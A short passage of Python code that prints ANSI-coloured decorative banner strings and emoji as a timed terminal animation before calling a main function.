\033[1;34m᯽                                      \033[1;34m᯽\n         \033[1;34m᯽⊰❊⊱╌─╌⊰᯽⊱•⊰᯽⊱╌──╌⊰❊❊⊱╌──╌⊰᯽⊱•⊰᯽⊱╌─╌⊰❊⊱᯽","\n                       😊😊😊😊😊"]
    for i in range(5):
        time.sleep(1)
        sys.stdout.write(f"\033[97;1m " + animation[i % len(animation)] +"")
        sys.stdout.flush()
    main()